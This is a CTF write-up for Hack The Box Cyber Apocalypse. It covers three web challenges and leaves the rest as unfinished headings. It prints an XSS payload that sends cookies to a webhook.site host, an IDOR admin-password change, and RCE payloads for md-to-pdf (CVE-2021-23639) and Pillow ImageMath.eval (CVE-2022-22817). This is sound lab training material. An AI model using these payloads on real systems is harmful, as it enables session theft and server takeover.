# Hack The Box - Cyber Apocalypse

A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.

------------

- [Pwn](#pwn)
	-  [Space Pirate: Entrypoint](#pwn1 "Space Pirate: Entrypoint")
	-  [Space pirate: Going Deeper](#pwn2)
	-  [Space pirate: Retribution](#pwn3)
	-  [Vault-breaker](#pwn4)
	-  [Fleet Management](#pwn5)
	-  [Hellbound](#pwn6)
	-  [Trick or Deal](#pwn7)
- [Web](#web)
	-  [Kryptos Support](#web1)
	-  [BlinkerFluids](#web2)
	-  [Amidst Us](#web3)
	-  [Intergalactic Post](#web4)
	-  [Acnologia Portal](#web5)
	-  [Red Island](#web6)
	-  [Mutation Lab](#web7)
- [Rev](#rev)
	-  [WIDE](#rev1)
- [Misc](#misc)
	-  [Compressor](#misc1)

------------

### Pwn
1. <p name="pwn1">Space Pirate: Entrypoint (★☆☆☆)</p>

2. <p name="pwn2">Space Pirate: Going Deeper (★☆☆☆)</p>

3. <p name="pwn3">Space pirate: Retribution (★☆☆☆)</p>

4. <p name="pwn4">Vault-breaker (★☆☆☆)</p>

5. <p name="pwn5">Fleet Management (★☆☆☆)</p>

6. <p name="pwn6">Hellbound (★★☆☆)</p>

7. <p name="pwn7">Trick or Deal (★★☆☆)</p>


<br/>

### Web
1. <p name="web1">Kryptos Support (★☆☆☆)</p>
For this challenge we were given a website with a `/login` & `/signup` pages. Upon signing up, we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web1.png'>
</p>

So, this should be a basic XSS since we didn't even get a source code. Going for a basic payload:

```html
<script>
    fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

Gives us the moderator's cookies! Having a look on them, we see a session cookie.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/session_web1.png'>
</p>

We add the session & we visit `/settings`. The magic happens & we are logged in. 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/settings_web1.png'>
</p>

There is no flag yet? We apparently need to access something higher, maybe an admin account? So we try the change password functionality & we have a look on the HTTP Request. We see that we are sending the UID in the request body:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/request_web1.png'>
</p>

Trying to find the admin ID, we change the UID to 1 & send our HTTP Request. We get a confirmation from the server:

```json
{
    "message": "Password for admin changed successfully!"
}
```

We login as the admin now & we get our flag: 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web1.png'>
</p>

<br/>

2. <p name="web2">BlinkerFluids (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/)). Looking into the website, we see an invoice list & an option to add a new invoice.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web2.png'>
</p>

If we try to create a new invoice, we get a nice default text that is formated with Markdown Language.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/new_invoice_web2.png'>
</p>

Now, let's dig into the source code. Starting with the [/routes/index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/routes/index.js), we see that the creation of an invoice uses an MDHelper.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/routes_web2.png'>
</p>

We then head to our helper file, located at [/helpers/MDHelper.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/helpers/MDHelper.js)

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/helpers_web2.png'>
</p>

So, if we consider our possible attack vectors, our main target will be the `md-to-pdf` module. So this will be our start!

The first thing we get related to security issues for this module will be `CVE-2021-23639`. It involves a Remote Code Execution caused by the gray-matter's JS-engine, which is enabled by default. This was fixed in version 5.0.0 of `md-to-pdf` but if we check [/package.json](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/package.json), we see that we are using version `4.1.0` so we got our exploit :)

For a proof of concept & more information, you can refer to these links:
- [Link 1](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- [Link 2](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

We have access to `/static` route which means, we can use it to write our command output there. Our final payload will be:

```
---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---
```

& we'll be able to access `/static/flag` route & get our flag: `HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

<br/>

3. <p name="web3">Amidst Us (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/)). We get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web3.png'>
</p>

We click on the picture in the center & it'll prompt us to select a file to upload. Upon selecting a picture, we see that the white areas become transparent, so this is somekind of a picture converter. Let's have a look on the source code for this.

As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/utils.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/utils.py). I've edited the source a little to help me debug the payload. The interesting part is the following:

```python
def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]
		
		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)
```

<br>

The rest of the function isn't important.<br/>So if we read the code, we can see that there is a `ImageMath.eval` that takes a string which contains `float` & `max` functions, this appears to be a python code maybe? We might use this part in order to get an RCE. Where is our input part?

We start first by viewing the HTTP requests. We see that we are sending a JSON object with 2 attributes:

```json
{
	"image":"iVBORw0K...............",
	"background":[255,255,255]
}
```

The image is sent as a base 64 string, we see that there is a background attribute too. If we check the [routes](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) file again, we see that our input is passed directly to the helper function, without any validation.

```python
@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json)
```

Now, we see that the `background` attribute is being used in the helper function & it's passed into the `ImageMath.eval` call:

```python
color = data.get('background', [255,255,255])
```

& since there is no validation, we can inject anything into the `color` array!

Before that, let's try to gather a bit more information about this method. A quick google search would land us on a `CVE-2022-22817` & we get the following ([Source](https://vuldb.com/?id.189840)):

> PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method.

Having a quick look at [/requirements.txt](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/requirements.txt), we see that we are using `Pillow 8.4.0` & now, we got our RCE confirmed.

As a start, I thought of crafting a payload to close the `max` & `float` calls then inject my code to be executed but after debuging a little bit, it was hell. I had to figure an other way to inject the code...

After a while, I remembered that we already know the flag's path. Also, I remembered that the `file.write` function returns the number of characters written into a file. So if we inject a `open().write` call, we'll get our code executed + return an integer to keep the execution of the helper function working. Combining that with a `open().read`, we can extract our flag into a public route, `/static`.

Of course, we can pop a shell by importing os & executing shell commands but meh, we know where our flag is so let's grab it & go.

We end up with a final payload:

```json
{
	"image":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAGgwJ/lK3Q6wAAAABJRU5ErkJggg==",
	"background":[
		255,
		"open('/app/application/static/flag', 'w').write(open('/flag.txt').read())",
		255
	]
}
```

& we get our flag in `/static/flag`: `HTB{i_slept_my_way_to_rce}`

<br/>

4. <p name="web4">Intergalactic Post (★☆☆☆)</p>

5. <p name="web5">Acnologia Portal (★★☆☆)</p>

6. <p name="web6">Red Island (★★☆☆)</p>

7. <p name="web7">Mutation Lab (★★☆☆)</p>

<br/>

### Rev
1. <p name="rev1">WIDE (★☆☆☆)</p>

<br/>

### Misc
1. <p name="misc1">Compressor (★☆☆☆)</p>


WIP